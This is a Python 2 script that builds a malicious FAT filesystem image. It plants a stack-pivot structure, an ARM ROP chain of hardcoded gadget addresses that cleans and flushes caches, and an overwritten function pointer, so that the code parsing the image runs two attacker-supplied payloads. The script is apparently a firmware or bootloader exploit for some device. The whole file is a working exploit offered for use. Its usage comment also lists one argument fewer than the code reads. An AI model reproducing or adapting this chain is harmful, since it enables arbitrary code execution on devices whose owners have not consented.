#!/usr/bin/env python2

from sys import argv, exit
import struct

def p32(x):
	return struct.pack("<I", x)

def ins(dst, off, src):
	if type(src) is list:
		out = b""
		for x in src:
			out += p32(x)
	else:
		out = src
	dst[off:off+len(out)] = out

def main():
	# ./gen.py fat.tpl payload.bin fat.out

	with open(argv[1], "rb") as fin:
		fat_tpl = bytearray(fin.read())
	with open(argv[2], "rb") as fin:
		first_bin = fin.read()
	with open(argv[3], "rb") as fin:
		second_bin = fin.read()

	if len(first_bin) >= 0x180:
		print "your first payload is too big!"
		exit(-1)
	if len(second_bin) >= 0x2000:
		print "your second payload is too big!"
		exit(-1)

	temp_store = 0x511671A0

	pivot = 0x51014f10 # e890b672 ldm r0, {r1, r4, r5, r6, r9, sl, ip, sp, pc}
	pop_pc = 0x5100155f
	pop_r0_pc = 0x5100fa31
	pop_r1_r2_r4_r6_pc = 0x51024b87
	blx_r3_pop_r3_pc = 0x51010033
	pop_r3_pc = 0x51010035
	flush_icache = 0x51014521 # ICIALLUIS
	clean_dcache = 0x5101456D
	debug_printf = 0x51012BD5

	pivot_args = [0, 0, 0, 0, 0, 0, 0, temp_store + 0x40, pop_pc]
	rop = [
		pop_r0_pc,
		temp_store,                # r0

		pop_r1_r2_r4_r6_pc,
		0x800,                     # r1
		0,                         # r2
		0,                         # r4
		0,                         # r6

		pop_r3_pc,
		clean_dcache,              # r3

		blx_r3_pop_r3_pc,
		flush_icache,              # r3

		blx_r3_pop_r3_pc,
		0,                         # r3
		temp_store + 0x80|1,
	]

	BASE = 0x5400

	# write pivot_args to temp_store
	ins(fat_tpl, BASE, pivot_args)
	# write rop to temp_store + 0x40
	ins(fat_tpl, BASE + 0x40, rop)
	# write payload to temp_store + 0x80
	ins(fat_tpl, BASE + 0x80, first_bin)
	# write second payload starting from block 5
	ins(fat_tpl, 5 * 0x200, second_bin)
	# write func ptr
	ins(fat_tpl, BASE + 0x638, [pivot])
	# write R0 arg to func ptr
	ins(fat_tpl, BASE + 0x63C, [temp_store])

	with open(argv[4], "wb") as fout:
		fout.write(fat_tpl)


if __name__ == "__main__":
	main()
